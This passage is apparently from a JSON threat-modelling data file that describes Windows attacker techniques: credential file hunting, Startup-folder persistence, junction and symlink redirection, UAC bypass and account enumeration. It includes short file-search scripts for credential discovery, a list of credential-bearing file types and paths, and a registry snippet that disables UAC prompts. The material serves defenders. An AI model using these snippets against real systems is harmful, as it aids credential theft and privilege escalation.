possible Windows explorer locations for browsing\n\nSome other paths in Windows Explorer may contain password manager details,\nfor example KeePass Password Database or similar.  \n\nExamples for paths in Windows Explorer (local locations or network shares):\n\n- `C:\\Users\\Public\\TempWorkingFiles\\PGM\\Documents\\Keepass\\`\n- `C:\\Users\\vernada\\AppData\\Local\\Microsoft\\AppV\\Client\\Integration\\{identifier_string}\\Root`\n- `C:\\ProgramData\\AppV\\{identifier_string}\\Root\\KeePass.exe`\n- `C:\\Users\\USERNAME\\Downloads\\EBSI credentials\\`\n- `E:\\KeePass-db\\`  \n\n### Automated scripts\n\nThe threat actors are using automated scripts that can search for specific\nfile extentions in Windows Explorer that usually contain sensitive data as \nuser and system credentials.  \n\n#### Batch script to search for files by a name\n\nExample:\n\n```\n@echo off\nset /p search_term=Enter search term: \nfor /f \"delims=\" %%a in ('dir /b /s *%search_term%*') do echo %%a\n```\n\n#### PowerShell script to search for files in Windows by content\n\nExample:\n\n```\n$search_term = Read-Host \"Enter search term\"\nGet-ChildItem -Path C:\\ -Recurse | Select-String -Pattern $search_term\n```\n\n#### Known extentions for files (possible to be discovered via Windows Explorer)\n\nBrowsing through Windows Explorer, threat actors are usually looking for\nfile extentions of files which may contain user's credentials ref [6].  \n\nExample for file extensions that may contain credentials:  \n\n- Compressed (archive) files: .zip, .tar, .gz, .tgz, .rar, and others\n- Java source files: .java\n- Text files: .txt\n- PDF documents: .pdf \n- Office file documents: .doc, .docx, .rtf, .xlsx, .pptx, .pps, .ppsm, .ppsx, .ppt\n- Backup files: .bak, .old and others\n- Archive files: .7z, .zip , .rar\n- Database files: .kd , kdbx, mdb\n- Configuration files: .config, .xml, .xsml, .xsl, .xsd, .xps, .sys\n- Execution files: .exe, .cmd, .ps1\n- Libraries: .dll\n- Shell configuration files: .bashrc, .zshrc, .cshrc\n- User AWS Folder .aws/credentials\n- Other possible files that may contain credentials: csv, tmp, .ssh, .wxs\n"
            },
            "cce22952-735a-4255-8319-e5e44aef9d85": {
                "name": "Windows startup folder abused by malware",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The Windows Startup folder is a legitimate feature in Windows that allows\nusers to specify programs or applications to launch automatically when the\noperating system starts. In several reports and analysis different threat\nactors have been known to abuse this feature to achieve persistence and\nevade detection on compromised systems. \n\nAs a first step the malware is distributed by an initial threat vector, for\nexample spear-phishing attack. Once the malware is on the targeted system it\ncreates a shortcut or executable file in the Windows Startup folder\nref [5], [6].\n\nThere are several different possible startup locations which can be used\nby the threat actors to run malicious programs. \n\nExamples:\n\n- `C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`\n- `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`.\n- `C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`\n- `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`\n\nA recent campaign, ref [2], showed threat actors exploiting a vulnerability\nin a software application  to deploy shortcut files in the startup folder,\nthat would point to the malicious executable.\n\nWhen the user logs in or the system boots, Windows automatically executes\nthe programs or applications in the Startup folder. Usually the malware is\ndisguised as a legitimate program and runs in the background, often without \nthe user's knowledge or consent.\n\n### Techniques used by malware\n\n- Shortcut files: Malware creates a shortcut file (.lnk) in the Startup  folder, pointing to the malicious executable.\n- Executable files: Malware places an executable file (.exe) directly in the  Startup folder.\n- Registry modifications: Some malware (Amadey) may also overwrite the \nWindows registry key, thush changing the startup folder to the ones \ncontaining its payload.\n- Scripts - some threat actors have used the startup folder as a persistence \nmechanism to execute script files.\n- Archive exploitation: WinRAR or crafted installers extract payloads into  the Startup folder (notably CVE-2023-38831 exploited in the wild).\n\n### Known malware families which can abuse a Windows Startup folder\n\n- Ransomware: Some ransomware variants, like WannaCry and NotPetya, used  the Startup folder to launch their malicious payloads.\n- Trojans: Trojans, such as Emotet and TrickBot, have been known to use the  Startup folder to maintain persistence on compromised systems.\n- Adware/PUP: Adware or Potentially Unwanted Programs (PUPs), like the \nnotorious Ask Toolbar, has been found to use the Startup folder to launch \nthemselves.  \n- LNK Loaders (e.g Gamaredon) ref [7].\n"
            },
            "9fc6fdcd-c06e-4f7b-8562-a6753d8be683": {
                "name": "Windows system links used for file redirection attack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "By using different types of file system links, such as hard links or junctions, \nattackers can trick the privileged component into operating on files which is \nnot supposed to access. The end goal for such attacks is usually to write an \nattacker-supplied executable (such as a DLL or a script) to the disk, \nand to get it executed with system permissions (ref \\[1\\]).  \n\nFor example, to achieve code execution as the SYSTEM user, threat actors start \nan orchestrator update service, which will result in a malicious DLL being run \nwith SYSTEM privileges due to a DLL hijacking issue within the Update Session \nOrchestrator Service. (ref \\[2\\])  \n\nThe most common file redirection links are:\n\n##### LNK files (shortcut files)\n\nThese are files with the .LNK extension, which are used to create shortcuts to \nother files or folders. Attackers can exploit LNK files to execute malicious \ncode by creating a shortcut that points to a malicious file instead of the original \nintended target.  \n\n##### Junction points\n\nJunction points are special folders in Windows that link to another folder, allowing \nthe operating system to treat the content of the target folder as if they were \nlocated in the junction point's folder. Attackers can use junction points to redirect \nfile access to a different location, potentially allowing them to access or modify \nfiles that should not be accessible.  \n\nJunctions are a feature of the NT file system (NTFS) that make it possible to link one \ndirectory into another. They are used by default, linking some directories such as \n\"C:\\\\Documents and Settings\".  \n\nA common vulnerable pattern may exist in the hard (junction) links as follows \n(for example CVE-2020-0787):\n\n* A privileged service exposes functionality that can be triggered through some \ninterprocess communication (IPC) mechanism, such as remote procedure call (RPC). \nThat functionality can be triggered by users running at lower privilege levels.  \n* That functionality operates on a file (writing data into that file) that is \nlocated under a globally writable directory. The operation is done without \nimpersonation, meaning it occurs with the permissions of that system service.  \n\nTo exploit this vulnerability in the system links a threat actor first creates a junction \nbetween that directory and their target, which is usually C:\\\\Windows or one of its \nsubdirectories. Next, the attacker triggers the RPC call, which follows the junction to \noverwrite a system DLL file. Finally, that malicious DLL is loaded by some service, \nand the attacker's supplied code gets executed with system permissions (ref \\[1\\]).  \n\n##### Symbolic links:\n\nSymbolic links (also known as symlinks or soft links) are similar to junction points, \nbut they can link to individual files as well as folders. Symbolic links can be used to \nredirect file access to a different file or folder, which may allow an attacker to \nexecute malicious code or access sensitive information.  \n\n##### NTFS Alternate Data Streams (ADS):\n\nAlternate Data Streams are a feature of the NTFS file system that allows storing \nmetadata within a file. Attackers can abuse ADS to hide malicious code or sensitive \ninformation within an innocent-looking file. When the file is accessed, the malicious \ncontent in the ADS is executed without the user's knowledge.  \n"
            },
            "d5add960-1b86-41d4-869a-1defd392c8f9": {
                "name": "Windows User Account Control (UAC) bypass",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "User Account Control (UAC) is a security feature implemented in the Windows \noperating system to prevent potentially harmful programs from making changes \nto user's computer. The threat actors explore and apply different techniques\nand ways to bypass this Winsows security mechanism ref [1].      \n\nFor example, some of the used techniques to bypass UAC are:\n\n### DLL Hijacking\n\nThis technique involves placing a malicious Dynamic Link Library (DLL) file\nin a directory that is part of the system's search path. When the targeted\napplication loads the required DLL, it inadvertently loads the malicious\nDLL instead, granting the attacker elevated privileges.  \n\nSome initially prepared payloads, for example a usage of rundll32.exe can\nload a specifically crafted DLL may auto-elevate COM objects and perform\na file operation in a protected directory which would typically require\nelevated access.  \n\n### COM Elevation\n\nComponent Object Model (COM) is a Microsoft technology used for\ncommunication between software components. By exploiting a vulnerability\nin the way the system handles COM objects, an attacker can elevate their\nprivileges and bypass UAC.  \n\n### Windows Registry modification\n\nA threat actor can change the behavior or the UAC prompt or even completely\nturn it off. Their goal is privilege escalation ref [2, 3].    \n\nExample:\n\n```\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]    \"ConsentPromptBehaviorUser\"=dword:00000000 ; Automatically deny elevation requests    \"EnableInstallerDetection\"=dword:00000000\n````\n\n### Fileless Attacks\n\nFileless attacks, such as PowerShell or Windows Management Instrumentation\n(WMI) exploits, can be used to execute malicious code in memory, without\nwriting any files to the disk. This allows the attacker to bypass UAC,\nas it doesn't monitor in-memory activities.\n\n### Privilege Escalation Vulnerabilities\n\nSome applications may have vulnerabilities that can be exploited to gain\nelevated privileges. By exploiting these vulnerabilities, an attacker\ncan bypass UAC and execute code with higher privileges.\n\nFor example, the Github readme page for UACMe contains an extensive list of \nmethods that have been discovered and implemented within UACMe or the process\neventvwr.exe can auto-elevate and execute a specified binary or script\nref [7].    \n\n### Malicious software installation (skip the UAC prompt)\n\nAnother technique to bypass the UAC could be achieved by malicious software\ninjected into a trusted process to gain elevated privileges without prompting\na user.\n"
            },
            "fe243f7f-ffc5-49c0-94e6-293ae2411ad6": {
                "name": "Windows User and Group Enumeration with specific tools",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may attempt to enumerate the environment and list all local system \nand domain accounts or groups.To achieve this purpose, they can use variety of \ntools and techniques. Their goal is reconnaissance, gathering of user's account \ninformation on the system or in the domain and further usage of accounts with higher \nprivilege access.\n\nThere are several tools that can be used by adversaries, such as the following:  \n- Kali Tool like enum4linux \n- Bloodhound can also \n- smbmap, smbclient, etc..\n- nmap\n- Use of any developped tools or scripts like this one: - windapsearch\n\nSome cases in which adversaries have used such tools include the following:\n\n## Wizard Spider using Bloodhound after Ryuk ransomware compromise:\n\nRyuk actors quickly map the network to understand the infection scope. They use native \ntools like net view, net computers, and ping to locate network shares and domain controllers. \nFor lateral movement, they rely on PowerShell, WMI, Remote Management, RDP, and third-party \ntool Bloodhound.\n"
            }
        }
    },
    "cdm": {
        "metadata": {
            "field": "cdm",
            "icon": "\ud83d\udee1\ufe0f",
            "name": "Detection Models",
            "description": "Detection Models",
            "model": true
        },
        "entries": {}
    },
    "bdr": {
        "metadata": {
            "field": "bdr",
            "icon": "\ud83c\udfdb\ufe0f",
            "name": "Business Requests",
            "description": "Business Requests",
            "model": true
        },
        "entries": {}
    },
    "mdr": {
        "metadata": {
            "field": "mdr",
            "icon": "\ud83d\udea8",
            "name": "Detection Rules",
            "description": "Detection Rules",
            "model": true
        },
        "entries": {}
    }
}